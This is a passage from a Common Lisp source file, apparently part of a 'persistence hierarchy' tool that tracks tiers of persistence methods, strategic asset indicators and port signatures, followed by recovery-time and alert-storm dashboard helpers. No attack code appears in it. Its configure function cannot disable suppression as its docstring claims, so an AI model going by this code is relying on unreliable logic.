  (persistence-hierarchy-init)"
  ;; Rebuild the tier lookup table
  (setf *persistence-tier-by-level* (make-hash-table))
  (dolist (tier *persistence-tiers*)
    (setf (gethash (pt-level tier) *persistence-tier-by-level*) tier))
  ;; Reset recovery tracking
  (clrhash *persistence-recovery-attempts*)
  ;; Log
  (format t "~&[PERSIST-INIT] Persistence Hierarchy v2.5 initialized~%")
  (format t "~&[PERSIST-INIT] Tiers: ~A~%" (length *persistence-tiers*))
  (format t "~&[PERSIST-INIT] Tier 1 methods: 15~%")
  (format t "~&[PERSIST-INIT] Tier 2 methods: 8~%")
  (format t "~&[PERSIST-INIT] Tier 3 methods: 5~%")
  (format t "~&[PERSIST-INIT] Strategic indicators: ~A~%"
          (length *strategic-asset-indicators*))
  (format t "~&[PERSIST-INIT] Port signatures: ~A~%"
          (length *strategic-asset-port-signatures*))
  (gossip-publish *tactical-telemetry-topic*
                  `(:event :subsystem-initialized
                    :subsystem :persistence-hierarchy
                    :version "2.5.0"
                    :tiers 3
                    :total-methods 28))
  t)

;; Auto-initialize on load
(persistence-hierarchy-init)

;;;; =========================================================================
;;;; Section 10: TTR & Alert Storm API Summary
;;;; =========================================================================
;;;; This section provides a quick-reference interface for operators
;;;; to query TTR statistics and manage alert storm suppression.
;;;; All functions here have full docstrings above.

(defun ttr-reset ()
  "Reset all TTR measurement state. Clears *TTR-RECOVERY-LOG* and
*ALERT-STORM-ALERT-HISTORY*. Useful when starting a new operational
phase or after maintenance.

Returns: Plist with :TTR-ENTRIES-CLEARED and :ALERT-HISTORY-CLEARED.

Example:
  (ttr-reset)"
  (let ((ttr-count (length *ttr-recovery-log*))
        (alert-count (length *alert-storm-alert-history*)))
    (setf *ttr-recovery-log* nil)
    (setf *alert-storm-alert-history* nil)
    (format t "~&[TTR-RESET] Cleared ~D TTR entries, ~D alert history entries~%"
            ttr-count alert-count)
    (list :ttr-entries-cleared ttr-count
          :alert-history-cleared alert-count)))

(defun ttr-dashboard ()
  "Print a concise TTR and alert storm dashboard to standard output.

Displays:
  - Recovery count, avg/min/max/last TTR
  - SLA compliance status (default 300s)
  - Alert storm suppression state
  - Number of suppressed events in buffer

Returns: Plist with all statistics.

Example:
  (ttr-dashboard)"
  (let ((stats (get-ttr-stats)))
    (format t "~%~%")
    (format t "===============================================================~%")
    (format t "          LISPMIND v2.5.1 -- TTR DASHBOARD~%")
    (format t "===============================================================~%")
    (format t "  TTR Measurement:    ~A~%" (if *ttr-measurement-active-p* "ACTIVE" "INACTIVE"))
    (format t "  Recoveries:         ~D (avg ~,1Fs, min ~Ds, max ~Ds)~%"
            (getf stats :recovery-count)
            (getf stats :avg-ttr-seconds)
            (getf stats :min-ttr-seconds)
            (getf stats :max-ttr-seconds))
    (format t "  Last TTR:           ~D seconds~%" (getf stats :last-ttr-seconds))
    (format t "  Open recoveries:    ~D~%" (getf stats :open-recoveries))
    (format t "  SLA (300s):         ~A~%"
            (if (ttr-within-sla-p 300) "COMPLIANT" "VIOLATED"))
    (format t "~%")
    (format t "  Storm Suppression:  ~A~%" (if *alert-storm-suppression-p* "ACTIVE" "INACTIVE"))
    (format t "  Storm Window:       ~Ds / max ~D alerts~%"
            *alert-storm-window-seconds* *alert-storm-max-alerts*)
    (format t "  Suppressed Buffer:  ~D events~%" (length *telemetry-suppression-buffer*))
    (format t "===============================================================~%")
    (format t "~%"))
  (append (get-ttr-stats)
          (list :sla-compliant (ttr-within-sla-p 300)
                :storm-suppression *alert-storm-suppression-p*
                :suppressed-buffer-count (length *telemetry-suppression-buffer*))))

(defun configure-alert-storm (&key (window-seconds nil) (max-alerts nil) (enabled nil))
  "Configure alert storm suppression parameters.

Keywords (all optional -- only provided values are changed):
  WINDOW-SECONDS -- New sliding window width in seconds.
  MAX-ALERTS     -- New per-type alert threshold within the window.
  ENABLED        -- T or NIL to enable/disable suppression globally.

Returns: Plist of current configuration.

Example:
  (configure-alert-storm :window-seconds 30 :max-alerts 5)"
  (when window-seconds
    (setf *alert-storm-window-seconds* window-seconds))
  (when max-alerts
    (setf *alert-storm-max-alerts* max-alerts))
  (when enabled
    (setf *alert-storm-suppression-p* enabled))
  (list :window-seconds *alert-storm-window-seconds*
        :max-alerts *alert-storm-max-alerts*
        :enabled *alert-storm-suppression-p*))

;;;; =========================================================================
;;;; End of LISPMIND v2.5 Persistence Hierarchy
;;;; =========================================================================
